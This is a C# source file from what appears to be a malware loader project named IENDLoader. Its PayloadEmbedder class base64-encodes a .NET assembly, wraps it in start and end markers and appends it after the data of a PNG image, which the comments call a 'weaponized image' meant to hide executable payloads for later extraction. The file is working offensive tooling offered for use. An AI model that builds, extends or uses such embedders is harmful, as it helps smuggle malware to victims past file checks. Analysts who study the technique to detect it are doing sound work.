using System;
using System.IO;
using System.Text;

namespace IENDLoader.Core
{
    /// <summary>
    /// Handles embedding .NET payloads into PNG images
    /// </summary>
    public class PayloadEmbedder
    {
        private const string MARKER_START = "BaseStart-";
        private const string MARKER_END = "-BaseEnd";

        /// <summary>
        /// Embeds a .NET assembly payload into a PNG image
        /// </summary>
        /// <param name="imagePath">Path to the cover PNG image</param>
        /// <param name="payloadPath">Path to the .NET assembly payload</param>
        /// <param name="outputPath">Path where weaponized image will be saved</param>
        /// <param name="progress">Optional progress callback (0.0 to 1.0)</param>
        public void EmbedPayload(string imagePath, string payloadPath, string outputPath, Action<double>? progress = null)
        {
            if (!File.Exists(imagePath))
                throw new FileNotFoundException("Cover image not found", imagePath);

            if (!File.Exists(payloadPath))
                throw new FileNotFoundException("Payload not found", payloadPath);

            progress?.Invoke(0.1);

            // Read the cover image
            byte[] imageData = File.ReadAllBytes(imagePath);
            progress?.Invoke(0.3);

            // Verify it's a PNG
            if (!IsPngImage(imageData))
                throw new InvalidOperationException("Selected file is not a valid PNG image");

            progress?.Invoke(0.4);

            // Read the payload
            byte[] payloadData = File.ReadAllBytes(payloadPath);
            progress?.Invoke(0.6);

            // Base64 encode the payload
            string encodedPayload = Convert.ToBase64String(payloadData);
            progress?.Invoke(0.7);

            // Create marker-wrapped payload
            string embeddedData = $"{MARKER_START}{encodedPayload}{MARKER_END}";
            byte[] embeddedBytes = Encoding.ASCII.GetBytes(embeddedData);
            progress?.Invoke(0.8);

            // Combine image and payload
            byte[] weaponizedImage = new byte[imageData.Length + embeddedBytes.Length];
            Buffer.BlockCopy(imageData, 0, weaponizedImage, 0, imageData.Length);
            Buffer.BlockCopy(embeddedBytes, 0, weaponizedImage, imageData.Length, embeddedBytes.Length);
            progress?.Invoke(0.9);

            // Write the weaponized image
            File.WriteAllBytes(outputPath, weaponizedImage);
            progress?.Invoke(1.0);
        }

        /// <summary>
        /// Verifies if the file is a valid PNG image
        /// </summary>
        private bool IsPngImage(byte[] data)
        {
            if (data.Length < 8)
                return false;

            // PNG signature: 89 50 4E 47 0D 0A 1A 0A
            return data[0] == 0x89 &&
                   data[1] == 0x50 &&
                   data[2] == 0x4E &&
                   data[3] == 0x47 &&
                   data[4] == 0x0D &&
                   data[5] == 0x0A &&
                   data[6] == 0x1A &&
                   data[7] == 0x0A;
        }

        /// <summary>
        /// Gets the size of the payload that will be embedded
        /// </summary>
        public long GetEmbeddedSize(string payloadPath)
        {
            if (!File.Exists(payloadPath))
                return 0;

            long payloadSize = new FileInfo(payloadPath).Length;
            // Base64 encoding increases size by ~33%
            long base64Size = (long)Math.Ceiling(payloadSize * 4.0 / 3.0);
            // Add marker overhead
            return base64Size + MARKER_START.Length + MARKER_END.Length;
        }
    }
}
